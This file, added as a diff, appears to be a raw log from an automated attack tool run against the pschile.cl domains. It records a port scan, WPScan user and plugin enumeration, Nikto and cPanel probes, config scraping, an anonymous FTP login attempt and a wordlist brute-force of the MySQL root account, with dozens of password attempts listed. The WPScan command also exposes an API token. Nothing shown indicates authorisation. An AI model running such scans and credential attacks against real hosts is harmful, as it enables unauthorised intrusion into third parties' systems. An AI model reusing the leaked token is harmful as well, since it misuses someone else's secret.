@@ -1,0 +1,198 @@
+===== DNS RESOLUTION =====
+[DNS] pschile.cl → 162.241.218.115
+[DNS] portal.pschile.cl → 162.241.218.115
+
+[SCAN] pschile.cl (162.241.218.115) — TOP 100
+  [HIGH] Port 21 (FTP) — OPEN
+  [LOW] Port 25 (SMTP) — OPEN
+  [LOW] Port 1723 (Unknown) — OPEN
+[DEBUG] Waiting for 61 threads...
+  [LOW] Port 143 (IMAP) — OPEN
+  [LOW] Port 53 (DNS) — OPEN
+  [LOW] Port 80 (HTTP) — OPEN
+  [LOW] Port 110 (POP3) — OPEN
+  [LOW] Port 22 (SSH) — OPEN
+  [HIGH] Port 2222 (SSH) — OPEN
+  [LOW] Port 443 (HTTPS) — OPEN
+  [LOW] Port 587 (Unknown) — OPEN
+  [LOW] Port 995 (Unknown) — OPEN
+  [LOW] Port 465 (Unknown) — OPEN
+  [LOW] Port 993 (Unknown) — OPEN
+  [LOW] Port 2096 (Unknown) — OPEN
+  [HIGH] Port 5432 (PostgreSQL) — OPEN
+  [HIGH] Port 3306 (MySQL) — OPEN
+  [HIGH] Port 2083 (cPanel) — OPEN
+[DEBUG] Done. Open ports: 18
+
+[SCAN] portal.pschile.cl (162.241.218.115) — TOP 100
+[DEBUG] Waiting for 61 threads...
+  [HIGH] Port 21 (FTP) — OPEN
+  [LOW] Port 25 (SMTP) — OPEN
+  [LOW] Port 1723 (Unknown) — OPEN
+  [LOW] Port 993 (Unknown) — OPEN
+  [LOW] Port 22 (SSH) — OPEN
+  [LOW] Port 110 (POP3) — OPEN
+  [LOW] Port 995 (Unknown) — OPEN
+  [LOW] Port 465 (Unknown) — OPEN
+  [LOW] Port 53 (DNS) — OPEN
+  [HIGH] Port 2222 (SSH) — OPEN
+  [LOW] Port 587 (Unknown) — OPEN
+  [LOW] Port 143 (IMAP) — OPEN
+  [HIGH] Port 2083 (cPanel) — OPEN
+  [LOW] Port 80 (HTTP) — OPEN
+  [LOW] Port 443 (HTTPS) — OPEN
+  [HIGH] Port 5432 (PostgreSQL) — OPEN
+  [LOW] Port 2096 (Unknown) — OPEN
+  [HIGH] Port 3306 (MySQL) — OPEN
+[DEBUG] Done. Open ports: 18
+
+===== SCAN SUMMARY =====
+
+[pschile] pschile.cl (162.241.218.115)
+  Port    21 (FTP            ) — HIGH
+  Port    22 (SSH            ) — LOW
+  Port    25 (SMTP           ) — LOW
+  Port    53 (DNS            ) — LOW
+  Port    80 (HTTP           ) — LOW
+  Port   110 (POP3           ) — LOW
+  Port   143 (IMAP           ) — LOW
+  Port   443 (HTTPS          ) — LOW
+  Port   465 (Unknown        ) — LOW
+  Port   587 (Unknown        ) — LOW
+  Port   993 (Unknown        ) — LOW
+  Port   995 (Unknown        ) — LOW
+  Port  1723 (Unknown        ) — LOW
+  Port  2083 (cPanel         ) — HIGH
+  Port  2096 (Unknown        ) — LOW
+  Port  2222 (SSH            ) — HIGH
+  Port  3306 (MySQL          ) — HIGH
+  Port  5432 (PostgreSQL     ) — HIGH
+
+[pschile2] portal.pschile.cl (162.241.218.115)
+  Port    21 (FTP            ) — HIGH
+  Port    22 (SSH            ) — LOW
+  Port    25 (SMTP           ) — LOW
+  Port    53 (DNS            ) — LOW
+  Port    80 (HTTP           ) — LOW
+  Port   110 (POP3           ) — LOW
+  Port   143 (IMAP           ) — LOW
+  Port   443 (HTTPS          ) — LOW
+  Port   465 (Unknown        ) — LOW
+  Port   587 (Unknown        ) — LOW
+  Port   993 (Unknown        ) — LOW
+  Port   995 (Unknown        ) — LOW
+  Port  1723 (Unknown        ) — LOW
+  Port  2083 (cPanel         ) — HIGH
+  Port  2096 (Unknown        ) — LOW
+  Port  2222 (SSH            ) — HIGH
+  Port  3306 (MySQL          ) — HIGH
+  Port  5432 (PostgreSQL     ) — HIGH
+
+[EXPORT] Results saved to reports/results.json
+[EXPORT] Results appended to reports/results.csv
+
+[ROUTER] Checking extractors for pschile.cl (162.241.218.115)
+  [CDN] pschile.cl is not behind Cloudflare — skipping bypass
+
+  [WPScan] Targeting https://www.pschile.cl
+  [WPScan] Running: wpscan --url https://www.pschile.cl --format json --no-update --disable-tls-checks --ignore-main-redirect --enumerate u,p,t --api-token nL5IQBV8aZTVXP4hXdEZWAUrhkSG0axd2foMGUc4SNs
+  [WPScan] Timed out after 120s
+
+  [Nikto] Targeting www.pschile.cl:443
+  [Nikto] Running: nikto -host www.pschile.cl -port 443 -Format csv -nointeractive -Tuning x9 -timeout 10 -ssl
+  [Nikto] Scan complete — 0 findings (0 HIGH, 0 MEDIUM, 0 INFO)
+
+  [cPanel] Targeting pschile.cl:2083
+  [cPanel] Could not reach login page
+
+  [CONFIG] Scraping config files on pschile.cl
+  [CONFIG] No exposed config files found
+  [MATCH] Port 21 (FTP) — launching extractor
+  [FTP] Connecting to 162.241.218.115:21
+  [FTP] Banner: 220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
+220-You are user number 3 of 150 allowed.
+220-Local time is now 07:34. Server port: 21.
+220 You will be disconnected after 15 minutes of inactivity.
+  [FTP] Anonymous login denied
+  [SKIP] Port 22 (SSH) — no extractor available
+  [SKIP] Port 25 (SMTP) — no extractor available
+  [SKIP] Port 53 (DNS) — no extractor available
+  [SKIP] Port 80 (HTTP) — no extractor available
+  [SKIP] Port 110 (POP3) — no extractor available
+  [SKIP] Port 143 (IMAP) — no extractor available
+  [SKIP] Port 443 (HTTPS) — no extractor available
+  [SKIP] Port 465 (Unknown) — no extractor available
+  [SKIP] Port 587 (Unknown) — no extractor available
+  [SKIP] Port 993 (Unknown) — no extractor available
+  [SKIP] Port 995 (Unknown) — no extractor available
+  [SKIP] Port 1723 (Unknown) — no extractor available
+  [SKIP] Port 2083 (cPanel) — no extractor available
+  [SKIP] Port 2096 (Unknown) — no extractor available
+  [SKIP] Port 2222 (SSH) — no extractor available
+  [MATCH] Port 3306 (MySQL) — launching extractor
+  [MySQL] Connecting to 162.241.218.115:3306
+  [MySQL] Version: unknown
+  [MySQL] Loaded 3 entries from user-10-million-usernames-dup.txt
+  [MySQL] Loaded 716 entries from pass-10-million-passwords-1000000.txt
+  [MySQL] Testing 2148 combinations...
+  [MySQL] Error testing root:root: no_salt
+  [MySQL] Error testing root:admin: no_salt
+  [MySQL] Error testing root:1234: no_salt
+  [MySQL] Error testing root:user: no_salt
+  [MySQL] Error testing root:Administrator: no_salt
+  [MySQL] Error testing root:administrador: no_salt
+  [MySQL] Error testing root:usuario2: no_salt
+  [MySQL] Error testing root:usuario: no_salt
+  [MySQL] Error testing root:user4: no_salt
+  [MySQL] Error testing root:user3: no_salt
+  [MySQL] Error testing root:user2: no_salt
+  [MySQL] Error testing root:user1: no_salt
+  [MySQL] Error testing root:12345: no_salt
+  [MySQL] Error testing root:123456: no_salt
+  [MySQL] Error testing root:daemon: no_salt
+  [MySQL] Error testing root:bin: no_salt
+  [MySQL] Error testing root:sys: no_salt
+  [MySQL] Error testing root:sync: no_salt
+  [MySQL] Error testing root:games: no_salt
+  [MySQL] Error testing root:man: no_salt
+  [MySQL] Error testing root:lp: no_salt
+  [MySQL] Error testing root:mail: no_salt
+  [MySQL] Error testing root:news: no_salt
+  [MySQL] Error testing root:uucp: no_salt
+  [MySQL] Error testing root:proxy: no_salt
+  [MySQL] Error testing root:www-data: no_salt
+  [MySQL] Error testing root:backup: no_salt
+  [MySQL] Error testing root:nobody: no_salt
+  [MySQL] Error testing root:a: no_salt
+  [MySQL] Error testing root:welcome123: no_salt
+  [MySQL] Error testing root:welcome: no_salt
+  [MySQL] Error testing root:webmaster: no_salt
+  [MySQL] Error testing root:webadmin: no_salt
+  [MySQL] Error testing root:vision: no_salt
+  [MySQL] Error testing root:valentin: no_salt
+  [MySQL] Error testing root:uuidd: no_salt
+  [MySQL] Error testing root:uploader: no_salt
+  [MySQL] Error testing root:unknown: no_salt
+  [MySQL] Error testing root:ubuntu: no_salt
+  [MySQL] Error testing root:ubnt: no_salt
+  [MySQL] Error testing root:trustno1: no_salt
+  [MySQL] Error testing root:toor: no_salt
+  [MySQL] Error testing root:tomcat: no_salt
+  [MySQL] Error testing root:thomas: no_salt
+  [MySQL] Error testing root:testtest: no_salt
+  [MySQL] Error testing root:test123: no_salt
+  [MySQL] Error testing root:test: no_salt
+  [MySQL] Error testing root:temptemp: no_salt
+  [MySQL] Error testing root:temporary: no_salt
+  [MySQL] Error testing root:temporal: no_salt
+  [MySQL] Error testing root:temp123: no_salt
+  [MySQL] Error testing root:tang: no_salt
+  [MySQL] Error testing root:systemadministrator: no_salt
+  [MySQL] Error testing root:systemadmin: no_salt
+  [MySQL] Error testing root:system32: no_salt
+  [MySQL] Error testing root:system: no_salt
+  [MySQL] Error testing root:sysadmin: no_salt
+  [MySQL] Error testing root:sys: no_salt
+  [MySQL] Error testing root:sybase: no_salt
+  [MySQL] Error testing root:support: no_salt
+  [MySQL] Error testing root:supervisor: no_salt
